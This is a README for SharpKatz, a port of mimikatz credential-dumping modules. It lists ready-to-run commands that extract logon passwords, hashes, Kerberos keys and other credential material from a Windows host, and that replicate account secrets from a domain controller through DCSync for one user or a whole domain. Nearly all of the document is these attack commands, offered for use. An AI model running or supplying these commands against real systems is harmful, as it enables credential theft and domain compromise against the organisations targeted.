# SharpKatz
Porting of mimikatz sekurlsa::logonpasswords,  sekurlsa::ekeys and lsadump::dcsync

**Usage**

Ekeys

```SharpKatz.exe --Command ekeys```

Msv

```SharpKatz.exe --Command msv```

Kerberos

```SharpKatz.exe --Command kerberos```

Tspkg

```SharpKatz.exe --Command tspkg```

Credman

```SharpKatz.exe --Command credman```

Wdigest

```SharpKatz.exe --Command wdigest```

Logonpasswords

```SharpKatz.exe --Command logonpasswords```

DCSync

```SharpKatz.exe --Command dcsync --User user --Domain userdomain --DomainController dc```<br>
```SharpKatz.exe --Command dcsync --Guid guid --Domain userdomain --DomainController dc```<br>
```SharpKatz.exe --Command dcsync --Domain userdomain --DomainController dc```<br>
